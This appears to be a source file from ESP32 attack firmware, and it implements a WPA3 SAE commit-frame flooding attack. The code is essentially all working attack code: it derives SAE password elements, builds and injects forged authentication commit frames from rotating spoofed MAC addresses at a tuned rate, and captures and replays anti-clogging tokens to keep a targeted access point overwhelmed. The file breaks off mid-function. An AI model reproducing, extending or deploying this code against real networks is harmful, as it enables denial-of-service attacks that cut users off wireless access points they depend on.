/**
 * @file sae_flood.c
 * @brief SAE (WPA3) handshake flooding attack implementation
 * 
 * This module handles SAE handshake flooding attacks which overwhelm WPA3 APs
 * with commit frames. Only supported on ESP32-C5 and ESP32-C6.
 * 
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/sae_flood.h"
#include "managers/wifi_manager.h"
#include "managers/settings_manager.h"
#include "managers/status_display_manager.h"
#include "core/system_manager.h"
#include "managers/views/terminal_screen.h"
#include "core/glog.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_log.h"
#include <esp_heap_caps.h>
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include "freertos/semphr.h"
#define MBEDTLS_DECLARE_PRIVATE_IDENTIFIERS
#include "mbedtls/private/ecp.h"
#include "mbedtls/private/sha256.h"
#include "mbedtls/private/bignum.h"
#include <stdio.h>
#include <string.h>
#include <ctype.h>

// External globals from wifi_manager.c
extern wifi_ap_record_t selected_ap;
extern wifi_ap_record_t *scanned_aps;
extern uint16_t ap_count;
extern FSettings G_Settings;

// External function from wifi_manager.c
extern void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback);
extern void wifi_manager_stop_monitor_mode(void);

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)

// SAE MAC pool configuration
#define SAE_MAC_POOL_SIZE 8
#define SAE_PRECOMPUTE_LIMIT 8
#define SAE_FRAME_BUFFER_SIZE 512
#define SAE_PASSWORD_BUF_LEN 64
#define SAE_INJ_ELEMENT_BUF_LEN 33

// Module state
static TaskHandle_t sae_flood_task_handle = NULL;
static TaskHandle_t sae_flood_display_task_handle = NULL;
static bool sae_flood_running = false;
static int sae_flood_packets_sent = 0;
static uint8_t sae_target_bssid[6];
static int sae_target_channel = 1;
static int sae_injection_rate = 25;

// MAC pool for spoofed addresses (heap-on-demand: see sae_heap_alloc)
static uint8_t (*sae_mac_pool)[6] = NULL;
static bool sae_mac_pool_ready = false;
static int sae_frames_per_mac = 32;

// Cached commit data per MAC (heap-on-demand: see sae_heap_alloc)
static uint8_t (*sae_commit_element_cache)[33] = NULL;
static uint8_t (*sae_commit_scalar_cache)[32] = NULL;
static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];

// Statistics
static uint32_t sae_cache_hits = 0;
static uint32_t sae_cache_misses = 0;
static uint32_t sae_pwe_failures = 0;
static uint32_t sae_token_rx = 0;
static uint32_t sae_commit_tx_ok = 0;
static uint32_t sae_commit_tx_err = 0;
static uint32_t sae_status76_rx = 0;
static uint32_t sae_status0_rx = 0;

// Token tracking (heap-on-demand: see sae_heap_alloc)
static uint8_t *sae_token_mac = NULL;
static bool sae_token_mac_valid = false;

static volatile bool sae_pending_peer = false;
static uint8_t *sae_pending_scalar = NULL;
static uint8_t *sae_pending_element = NULL;

// SAE protocol state
typedef struct {
    uint8_t peer_mac[6];
    uint8_t own_mac[6];
    uint8_t bssid[6];
    char password[64];
    mbedtls_ecp_group group;
    mbedtls_ecp_point pwe;          // Password Element
    mbedtls_ecp_point peer_element;
    mbedtls_ecp_point own_element;
    mbedtls_mpi peer_scalar;
    mbedtls_mpi own_scalar;
    mbedtls_mpi rand;
    mbedtls_mpi mask;
    uint8_t kck[32];
    uint8_t pmk[32];
    uint8_t token[32];
    uint16_t token_len;
    bool token_required;
    int sync;
    int rc;
} sae_data_t;

static sae_data_t sae_ctx;
static bool sae_initialized = false;
static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
static SemaphoreHandle_t sae_crypto_mutex = NULL;

// Static buffers to reduce stack usage (heap-on-demand: see sae_heap_alloc)
static uint8_t *sae_pwd_seed = NULL;
static uint8_t *sae_pwd_value = NULL;

// Static mbedTLS contexts
static mbedtls_sha256_context sae_sha256;
static mbedtls_ecp_point sae_tmp_point;
static bool sae_crypto_initialized = false;

/* Heap-on-demand attack buffers (~1.6KB internal when idle). PSRAM first,
 * internal fallback. Allocated in sae_flood_start before running=true is set
 * and freed in sae_flood_stop after tasks join and monitor mode stops, so no
 * use site needs a NULL check while the attack runs. */
// Declared here (ahead of sae_heap_alloc/free) so the helpers can use them.
static uint8_t *sae_frame_buffer = NULL;
static char *sae_flood_password_buf = NULL;
static uint8_t *sae_inj_element_x = NULL;
static uint8_t *sae_inj_element_buf = NULL;
static void *sae_heap_calloc(size_t n, size_t size) {
    void *p = heap_caps_calloc(n, size, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!p) {
        p = heap_caps_calloc(n, size, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    }
    return p;
}

static void sae_heap_free(void) {
    heap_caps_free(sae_mac_pool); sae_mac_pool = NULL;
    heap_caps_free(sae_commit_element_cache); sae_commit_element_cache = NULL;
    heap_caps_free(sae_commit_scalar_cache); sae_commit_scalar_cache = NULL;
    heap_caps_free(sae_pwd_seed); sae_pwd_seed = NULL;
    heap_caps_free(sae_pwd_value); sae_pwd_value = NULL;
    heap_caps_free(sae_frame_buffer); sae_frame_buffer = NULL;
    heap_caps_free(sae_flood_password_buf); sae_flood_password_buf = NULL;
    heap_caps_free(sae_pending_scalar); sae_pending_scalar = NULL;
    heap_caps_free(sae_pending_element); sae_pending_element = NULL;
    heap_caps_free(sae_token_mac); sae_token_mac = NULL;
    heap_caps_free(sae_inj_element_x); sae_inj_element_x = NULL;
    heap_caps_free(sae_inj_element_buf); sae_inj_element_buf = NULL;
}

static bool sae_heap_alloc(void) {
    sae_mac_pool = sae_heap_calloc(SAE_MAC_POOL_SIZE, 6);
    sae_commit_element_cache = sae_heap_calloc(SAE_MAC_POOL_SIZE, 33);
    sae_commit_scalar_cache = sae_heap_calloc(SAE_MAC_POOL_SIZE, 32);
    sae_pwd_seed = sae_heap_calloc(128, 1);
    sae_pwd_value = sae_heap_calloc(32, 1);
    sae_frame_buffer = sae_heap_calloc(SAE_FRAME_BUFFER_SIZE, 1);
    sae_flood_password_buf = sae_heap_calloc(SAE_PASSWORD_BUF_LEN, 1);
    sae_pending_scalar = sae_heap_calloc(32, 1);
    sae_pending_element = sae_heap_calloc(33, 1);
    sae_token_mac = sae_heap_calloc(6, 1);
    sae_inj_element_x = sae_heap_calloc(32, 1);
    sae_inj_element_buf = sae_heap_calloc(SAE_INJ_ELEMENT_BUF_LEN, 1);
    if (!sae_mac_pool || !sae_commit_element_cache || !sae_commit_scalar_cache ||
        !sae_pwd_seed || !sae_pwd_value || !sae_frame_buffer || !sae_flood_password_buf ||
        !sae_pending_scalar || !sae_pending_element || !sae_token_mac ||
        !sae_inj_element_x || !sae_inj_element_buf) {
        sae_heap_free();
        return false;
    }
    return true;
}



static int sae_random_func(void *ctx, unsigned char *buf, size_t len) {
    (void)ctx;
    esp_fill_random(buf, len);
    return 0;
}

// Static frame buffer (heap-on-demand: see sae_heap_alloc, declared above)

// Forward declarations
static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
static esp_err_t sae_generate_commit(sae_data_t *sae);
static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);

/**
 * Derive Password-to-Element (PWE) using hunt-and-peck method
 */
static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1, 
                                const uint8_t *addr2, const char *ssid,
                                mbedtls_ecp_point *pwe, mbedtls_ecp_group *group) {
    if (!sae_crypto_mutex) sae_crypto_mutex = xSemaphoreCreateMutex();
    if (sae_crypto_mutex) xSemaphoreTake(sae_crypto_mutex, portMAX_DELAY);
    mbedtls_mpi x, y, tmp;
    int counter = 1;
    bool found = false;
    (void)ssid;
    ESP_LOGI("SAE_PWE", "derive start");
    
    mbedtls_mpi_init(&x); mbedtls_mpi_init(&y); mbedtls_mpi_init(&tmp);
    mbedtls_sha256_init(&sae_sha256);
    
    while (!found && counter <= 40) {
        int pos = 0;
        if (memcmp(addr1, addr2, 6) > 0) {
            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
        } else {
            memcpy(sae_pwd_seed + pos, addr2, 6); pos += 6;
            memcpy(sae_pwd_seed + pos, addr1, 6); pos += 6;
        }
        
        int pwd_len = strlen(password);
        memcpy(sae_pwd_seed + pos, password, pwd_len);
        pos += pwd_len;
        sae_pwd_seed[pos++] = counter;
        
        mbedtls_sha256_starts(&sae_sha256, 0);
        mbedtls_sha256_update(&sae_sha256, sae_pwd_seed, pos);
        mbedtls_sha256_finish(&sae_sha256, sae_pwd_value);
        
        mbedtls_mpi_read_binary(&x, sae_pwd_value, 32);
        mbedtls_mpi_mod_mpi(&x, &x, &group->P);
        
        mbedtls_mpi_mul_mpi(&tmp, &x, &x);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_mul_mpi(&tmp, &tmp, &x);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_mul_mpi(&y, &group->A, &x);
        mbedtls_mpi_mod_mpi(&y, &y, &group->P);
        mbedtls_mpi_add_mpi(&tmp, &tmp, &y);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        mbedtls_mpi_add_mpi(&tmp, &tmp, &group->B);
        mbedtls_mpi_mod_mpi(&tmp, &tmp, &group->P);
        
        uint8_t point_buf[33];
        memcpy(point_buf + 1, sae_pwd_value, 32);
        point_buf[0] = 0x02;
        if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
            found = true;
        } else {
            point_buf[0] = 0x03;
            if (mbedtls_ecp_point_read_binary(group, pwe, point_buf, 33) == 0) {
                found = true;
            } else {
                counter++;
            }
        }
    }
    
    mbedtls_mpi_free(&x); mbedtls_mpi_free(&y); mbedtls_mpi_free(&tmp);
    mbedtls_sha256_free(&sae_sha256);
    ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
    
    if (sae_crypto_mutex) xSemaphoreGive(sae_crypto_mutex);
    return found ? ESP_OK : ESP_FAIL;
}

/**
 * Generate SAE commit scalar and element
 */
static esp_err_t sae_generate_commit(sae_data_t *sae) {
    ESP_LOGI("SAE_COMMIT", "gen start");
    if (!sae_crypto_initialized) {
        mbedtls_ecp_point_init(&sae_tmp_point);
        sae_crypto_initialized = true;
    }
    
    mbedtls_mpi_fill_random(&sae->rand, 32, sae_random_func, NULL);
    mbedtls_mpi_fill_random(&sae->mask, 32, sae_random_func, NULL);
    
    mbedtls_mpi_add_mpi(&sae->own_scalar, &sae->rand, &sae->mask);
    mbedtls_mpi_mod_mpi(&sae->own_scalar, &sae->own_scalar, &sae->group.N);
    if (mbedtls_mpi_cmp_int(&sae->own_scalar, 0) == 0) {
        mbedtls_mpi_lset(&sae->own_scalar, 1);
    }
    
    {
        mbedtls_mpi mask_mod, mask_neg;
        mbedtls_mpi_init(&mask_mod);
        mbedtls_mpi_init(&mask_neg);
        mbedtls_mpi_mod_mpi(&mask_mod, &sae->mask, &sae->group.N);
        if (mbedtls_mpi_cmp_int(&mask_mod, 0) == 0) {
            mbedtls_mpi_lset(&mask_mod, 1);
        }
        mbedtls_mpi_sub_mpi(&mask_neg, &sae->group.N, &mask_mod);
        if (mbedtls_mpi_cmp_int(&mask_neg, 0) == 0) {
            mbedtls_mpi_lset(&mask_neg, 1);
        }
        if (mbedtls_ecp_mul(&sae->group, &sae->own_element, &mask_neg, &sae->pwe,
                            sae_random_func, NULL) != 0) {
            mbedtls_mpi_free(&mask_mod);
            mbedtls_mpi_free(&mask_neg);
            return ESP_FAIL;
        }
        mbedtls_mpi_free(&mask_mod);
        mbedtls_mpi_free(&mask_neg);
    }
    ESP_LOGI("SAE_COMMIT", "gen ok");
    return ESP_OK;
}

/**
 * Initialize SAE context with proper PWE derivation
 */
static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac,
                                  const uint8_t *peer_mac, const char *ssid) {
    if (sae_initialized &&
        memcmp(sae_ctx.own_mac, own_mac, 6) == 0 &&
        memcmp(sae_ctx.peer_mac, peer_mac, 6) == 0) {
        return ESP_OK;
    }

    if (!sae_initialized) {
        memset(&sae_ctx, 0, sizeof(sae_ctx));
        mbedtls_ecp_group_init(&sae_ctx.group);
        mbedtls_ecp_point_init(&sae_ctx.pwe);
        mbedtls_ecp_point_init(&sae_ctx.peer_element);
        mbedtls_ecp_point_init(&sae_ctx.own_element);
        mbedtls_mpi_init(&sae_ctx.peer_scalar);
        mbedtls_mpi_init(&sae_ctx.own_scalar);
        mbedtls_mpi_init(&sae_ctx.rand);
        mbedtls_mpi_init(&sae_ctx.mask);
        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            return ESP_FAIL;
        }
        sae_initialized = true;
    }

    strncpy(sae_ctx.password, password, sizeof(sae_ctx.password) - 1);
    memcpy(sae_ctx.own_mac, own_mac, 6);
    memcpy(sae_ctx.peer_mac, peer_mac, 6);
    memcpy(sae_ctx.bssid, peer_mac, 6);
    
    if (sae_derive_pwe(password, own_mac, peer_mac, ssid, &sae_ctx.pwe, &sae_ctx.group) != ESP_OK) {
        return ESP_FAIL;
    }
    
    return ESP_OK;
}

static void sanitize_password_input(const char *in, char *out, size_t out_size) {
    if (!out || out_size == 0) return;
    if (!in) { out[0] = '\0'; return; }
    while (*in && isspace((unsigned char)*in)) in++;
    const char *end = in + strlen(in);
    while (end > in && isspace((unsigned char)end[-1])) end--;
    if (end > in + 1 && (in[0] == '"' || in[0] == '\'')) {
        char q = in[0];
        if (end[-1] == q) { in++; end--; }
    }
    size_t n = (size_t)(end - in);
    if (n >= out_size) n = out_size - 1;
    if (n > 0) memcpy(out, in, n);
    out[n] = '\0';
}

static uint8_t sae_inj_token_buf[128];
// (sae_inj_element_x / sae_inj_element_buf are heap-on-demand, declared above)

static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
    int frame_len = 0;
    bool token_required_local = false;
    uint16_t token_len_local = 0;
    
    // 802.11 Authentication header
    sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;
    sae_frame_buffer[2] = 0x00; sae_frame_buffer[3] = 0x00;
    memcpy(sae_frame_buffer + 4, sae_target_bssid, 6);
    memcpy(sae_frame_buffer + 10, src_mac, 6);
    memcpy(sae_frame_buffer + 16, sae_target_bssid, 6);
    uint16_t seq = esp_random() & 0x0FFF;
    sae_frame_buffer[22] = (seq << 4) & 0xF0;
    sae_frame_buffer[23] = (seq >> 4) & 0xFF;
    frame_len = 24;
    
    sae_frame_buffer[frame_len++] = 0x03; sae_frame_buffer[frame_len++] = 0x00;
    sae_frame_buffer[frame_len++] = 0x01; sae_frame_buffer[frame_len++] = 0x00;
    sae_frame_buffer[frame_len++] = 0x00; sae_frame_buffer[frame_len++] = 0x00;
    
    sae_frame_buffer[frame_len++] = 0x13; sae_frame_buffer[frame_len++] = 0x00;
    
    portENTER_CRITICAL(&sae_lock);
    token_required_local = sae_ctx.token_required;
    token_len_local = sae_ctx.token_len;
    if (token_required_local && token_len_local > 0) {
        if (token_len_local > sizeof(sae_inj_token_buf)) token_len_local = sizeof(sae_inj_token_buf);
        memcpy(sae_inj_token_buf, sae_ctx.token, token_len_local);
    }
    portEXIT_CRITICAL(&sae_lock);
    ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
    
    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
    const char *ssid = NULL;
    if (!sae_crypto_initialized) {
        mbedtls_ecp_point_init(&sae_tmp_point);
        sae_crypto_initialized = true;
    }
    if (!sae_initialized) {
        mbedtls_ecp_group_init(&sae_ctx.group);
        mbedtls_ecp_point_init(&sae_ctx.pwe);
        mbedtls_ecp_point_init(&sae_ctx.peer_element);
        mbedtls_ecp_point_init(&sae_ctx.own_element);
        mbedtls_mpi_init(&sae_ctx.peer_scalar);
        mbedtls_mpi_init(&sae_ctx.own_scalar);
        mbedtls_mpi_init(&sae_ctx.rand);
        mbedtls_mpi_init(&sae_ctx.mask);
        if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            return ESP_FAIL;
        }
        sae_initialized = true;
    }

    int pool_idx = -1;
    if (sae_mac_pool_ready) {
        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
            if (memcmp(sae_mac_pool[i], src_mac, 6) == 0) { pool_idx = i; break; }
        }
    }
    bool used_cache = false;
    if (pool_idx >= 0 && pwd && strlen(pwd) > 0 && sae_commit_cache_ready[pool_idx]) {
        portENTER_CRITICAL(&sae_lock);
        memcpy(sae_ctx.own_mac, src_mac, 6);
        memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
        memcpy(sae_ctx.bssid, sae_target_bssid, 6);
        mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
        portEXIT_CRITICAL(&sae_lock);
        if ((size_t)frame_len + 32 + 32 > SAE_FRAME_BUFFER_SIZE) {
            return ESP_ERR_NO_MEM;
        }
        memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
        frame_len += 32;
        memcpy(sae_frame_buffer + frame_len, sae_commit_element_cache[pool_idx] + 1, 32);
        frame_len += 32;
        used_cache = true;
        sae_cache_hits++;
        ESP_LOGI("SAE_TX", "cache hit idx=%d", pool_idx);
    } else {
        if (!(pwd && strlen(pwd) > 0)) return ESP_FAIL;
        if (sae_init_context(pwd, src_mac, sae_target_bssid, ssid) != ESP_OK ||
            sae_generate_commit(&sae_ctx) != ESP_OK) {
            mbedtls_ecp_group_free(&sae_ctx.group);
            mbedtls_ecp_point_free(&sae_ctx.pwe);
            mbedtls_ecp_point_free(&sae_ctx.peer_element);
            mbedtls_ecp_point_free(&sae_ctx.own_element);
            mbedtls_mpi_free(&sae_ctx.peer_scalar);
            mbedtls_mpi_free(&sae_ctx.own_scalar);
            mbedtls_mpi_free(&sae_ctx.rand);
            mbedtls_mpi_free(&sae_ctx.mask);
            memset(&sae_ctx, 0, sizeof(sae_ctx));
            sae_initialized = false;
            return ESP_FAIL;
        }
        sae_cache_misses++;
        ESP_LOGI("SAE_TX", "cache miss derive ok");
    }
    
    if (!used_cache) {
        size_t elen = 0;
        if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                           MBEDTLS_ECP_PF_COMPRESSED, &elen,
                                           sae_inj_element_buf, SAE_INJ_ELEMENT_BUF_LEN) != 0 || elen < 33) {
            return ESP_FAIL;
        }
        memcpy(sae_inj_element_x, sae_inj_element_buf + 1, 32);
        if ((size_t)frame_len + 32 + 32 > SAE_FRAME_BUFFER_SIZE) {
            return ESP_ERR_NO_MEM;
        }
        mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
        frame_len += 32;
        memcpy(sae_frame_buffer + frame_len, sae_inj_element_x, 32);
        frame_len += 32;
    }
    ESP_LOGI("SAE_TX", "frm len=%d", frame_len);

    if (token_required_local && token_len_local > 0) {
        size_t remaining = SAE_FRAME_BUFFER_SIZE - frame_len;
        if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
        if (token_len_local > 0) {
            memcpy(sae_frame_buffer + frame_len, sae_inj_token_buf, token_len_local);
            frame_len += token_len_local;
        }
    }
    
    if (pool_idx >= 0) {
        uint16_t s = ++sae_seq_counters[pool_idx] & 0x0FFF;
        sae_frame_buffer[22] = (s << 4) & 0xF0;
        sae_frame_buffer[23] = (s >> 4) & 0xFF;
    }
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, sae_frame_buffer, frame_len, false);
    if (err == ESP_OK) {
        sae_flood_packets_sent++;
        sae_commit_tx_ok++;
        ESP_LOGI("SAE_TX", "tx ok");
    } else {
        ESP_LOGE("SAE_FLOOD", "SAE commit injection failed: %s", esp_err_to_name(err));
        sae_commit_tx_err++;
    }
    return err;
}

static void sae_flood_task(void *param) {
    uint8_t spoofed_mac[6];
    uint8_t base_mac[6];
    int frame_counter = 0;
    int backoff_ms = 0;
    int consecutive_no_mem = 0;
    int rate_scale_pct = 100;
    int success_streak = 0;
    
    esp_wifi_get_mac(WIFI_IF_STA, base_mac);
    
    printf("SAE flood started on ch %d\n", sae_target_channel);
    printf("Target: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
           sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
    printf("Rate: %d fps\n", sae_injection_rate);
    
    while (sae_flood_running) {
        if ((frame_counter % 100) == 0) {
            ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
        }
        if (sae_pending_peer) {
            const char *pwe_pwd = settings_get_sta_password(&G_Settings);
            const char *pwe_ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
            if (pwe_pwd && strlen(pwe_pwd) > 0) {
                ESP_LOGI("SAE_FLOOD", "processing pending peer data");
                sae_derive_pwe(pwe_pwd, sae_ctx.own_mac, sae_target_bssid, pwe_ssid, &sae_ctx.pwe, &sae_ctx.group);
            }
            sae_pending_peer = false;
        }
        if (sae_token_mac_valid) {
            memcpy(spoofed_mac, sae_token_mac, 6);
        } else if (sae_mac_pool_ready) {
            int pool_idx = (frame_counter / (sae_frames_per_mac > 0 ? sae_frames_per_mac : 1)) % SAE_MAC_POOL_SIZE;
            memcpy(spoofed_mac, sae_mac_pool[pool_idx], 6);
        } else {
            memcpy(spoofed_mac, base_mac, 6);
            spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
            spoofed_mac[5] = frame_counter & 0xFF;
            spoofed_mac[0] |= 0x02;
            spoofed_mac[0] &= 0xFE;
        }
        
        esp_err_t tx_res = inject_sae_commit_frame(spoofed_mac, frame_counter);
        if (tx_res == ESP_ERR_NO_MEM) {
            consecutive_no_mem++;
            success_streak = 0;
            backoff_ms = (backoff_ms == 0) ? 50 : (backoff_ms * 2);
            if (backoff_ms > 1000) backoff_ms = 1000;
            if (rate_scale_pct > 10) {
                rate_scale_pct -= 20;
                if (rate_scale_pct < 10) rate_scale_pct = 10;
            }
            ESP_LOGW("SAE_FLOOD", "ESP_ERR_NO_MEM, backing off %d ms (streak=%d)", backoff_ms, consecutive_no_mem);
            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
        } else if (tx_res != ESP_OK) {
            vTaskDelay(pdMS_TO_TICKS(20));
        } else {
            if (backoff_ms > 0) backoff_ms /= 2;
            if (consecutive_no_mem) consecutive_no_mem = 0;
            if (++success_streak >= 10) {
                success_streak = 0;
                if (rate_scale_pct < 100) {
                    rate_scale_pct += 10;
                    if (rate_scale_pct > 100) rate_scale_pct = 100;
                }
            }
        }
        
        frame_counter = (frame_counter + 1) % 65536;
        
        int base_rate = (sae_injection_rate * rate_scale_pct) / 100;
        int variation = (esp_random() % 20) - 10;
        int actual_rate = base_rate + (base_rate * variation / 100);
        if (actual_rate < 1) actual_rate = 1;
        if (actual_rate > 200) actual_rate = 200;
        
        int delay_ms = 1000 / actual_rate;
        if (delay_ms < 2) delay_ms = 2;
        if (backoff_ms > delay_ms) delay_ms = backoff_ms;
        vTaskDelay(pdMS_TO_TICKS(delay_ms));
        
        if ((frame_counter % 10) == 0) {
            taskYIELD();
        }
    }
    
    printf("SAE flood stopped. Sent: %d\n", sae_flood_packets_sent);
    sae_flood_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

static void sae_flood_display_task(void *param) {
    int last_count = 0;
    
    while (sae_flood_running) {
        int frames_in_period = sae_flood_packets_sent - last_count;
        int current_rate = frames_in_period / 5;
        last_count = sae_flood_packets_sent;
        
        glog("SAE-Flood: %d/sec | Total: %d | hits:%u miss:%u pwefail:%u tok:%u txok:%u txerr:%u\n",
               current_rate, sae_flood_packets_sent,
               (unsigned)sae_cache_hits, (unsigned)sae_cache_misses,
               (unsigned)sae_pwe_failures, (unsigned)sae_token_rx,
               (unsigned)sae_commit_tx_ok, (unsigned)sae_commit_tx_err);
        
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
    
    sae_flood_display_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

/**
 * SAE monitoring callback to handle commit/confirm responses and anti-clogging tokens
 */
static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    wifi_ieee80211_mac_hdr_t hdr_copy;
    memcpy(&hdr_copy, &ipkt->hdr, sizeof(wifi_ieee80211_mac_hdr_t));
    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;
    
    if ((hdr->frame_ctrl & 0xFC) != 0xB0) return;
    if (memcmp(hdr->addr2, sae_target_bssid, 6) != 0) return;
    
    const uint8_t *auth_body = ipkt->payload;
    uint16_t auth_alg = auth_body[0] | (auth_body[1] << 8);
    uint16_t auth_seq = auth_body[2] | (auth_body[3] << 8);
    uint16_t status_code = auth_body[4] | (auth_body[5] << 8);
    
    if (auth_alg != 3) return;
    
    if (auth_seq == 1) {
        if (status_code == 76) {
            ESP_LOGI("SAE_RX", "status 76 token required");
            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
            const uint8_t *auth_payload = (const uint8_t*)ipkt;
            const uint8_t *ptr = auth_body + 8;
            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
            uint16_t tlen = 0;
            if (group_id == 19 && remaining >= 2) {
                tlen = (remaining > sizeof(sae_ctx.token)) ? sizeof(sae_ctx.token) : (uint16_t)remaining;
            }
            portENTER_CRITICAL(&sae_lock);
            sae_ctx.token_required = (tlen > 0);
            sae_ctx.token_len = tlen;
            if (tlen) memcpy(sae_ctx.token, ptr, tlen);
            portEXIT_CRITICAL(&sae_lock);
            memcpy(sae_token_mac, hdr->addr1, 6);
            sae_token_mac_valid = true;
            sae_token_rx++;
            sae_status76_rx++;
        } else if (status_code == 0) {
            ESP_LOGI("SAE_RX", "status 0 commit accepted");
            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
            if (remaining < 64) return;
            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
            if (group_id == 19) {
                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
                uint8_t peer_element_buf[33] = {0x02};
                memcpy(peer_element_buf + 1, auth_body + 40, 32);
                mbedtls_ecp_point_read_binary(&sae_ctx.group, &sae_ctx.peer_element, 
                                              peer_element_buf, 33);
                if (sae_mac_pool_ready) {
                    for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
                        if (sae_commit_cache_ready[i] && memcmp(hdr->addr1, sae_mac_pool[i], 6) == 0) {
                            portENTER_CRITICAL(&sae_lock);
                            memcpy(sae_ctx.own_mac, sae_mac_pool[i], 6);
                            memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
                            memcpy(sae_ctx.bssid, sae_target_bssid, 6);
                            mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
                            portEXIT_CRITICAL(&sae_lock);
                            ESP_LOGI("SAE_RX", "matched pool idx=%d", i);
                            break;
                        }
                    }
                }

                if (!sae_pending_peer) {
                    memcpy(sae_pending_scalar, auth_body + 8, 32);
                    memcpy(sae_pending_element, peer_element_buf, 33);
                    sae_pending_peer = true;
                }
                
                sae_status0_rx++;
                portENTER_CRITICAL(&sae_lock);
                sae_ctx.token_required = false;
                sae_ctx.token_len = 0;
                portEXIT_CRITICAL(&sae_lock);
                sae_token_mac_valid = false;
            }
        }
    } else if (auth_seq == 2) {
        ESP_LOGI("SAE_RX", "confirm status=%u", (unsigned)status_code);
    }
}

void sae_flood_start(const char *password) {
    if (sae_flood_running) {
        glog("SAE flood attack already running\n");
        return;
    }

    if (ap_count == 0 || scanned_aps == NULL) {
        glog("No AP selected. Use 'select -a <index>' first\n");
        return;
    }
    
    bool supports_wpa3 = false;
    if (selected_ap.authmode == WIFI_AUTH_WPA3_PSK || 
        selected_ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK
#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
        || selected_ap.authmode == WIFI_AUTH_WPA3_ENTERPRISE
#endif
        ) {
        supports_wpa3 = true;
    }

    if (!supports_wpa3) {
        glog("Selected AP does not support WPA3/SAE authentication\n");
        glog("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
        return;
    }

    if (!sae_heap_alloc()) {
        glog("SAE flood: out of memory for attack buffers\n");
        return;
    }

    memcpy(sae_target_bssid, selected_ap.bssid, 6);
    sae_target_channel = selected_ap.primary;
    sae_injection_rate = 60;
    sae_flood_packets_sent = 0;
    sae_flood_running = true;
    sae_initialized = false;
    sanitize_password_input(password, sae_flood_password_buf, SAE_PASSWORD_BUF_LEN);
    portENTER_CRITICAL(&sae_lock);
    sae_ctx.token_required = false;
    sae_ctx.token_len = 0;
    portEXIT_CRITICAL(&sae_lock);

    // Build MAC pool
    {
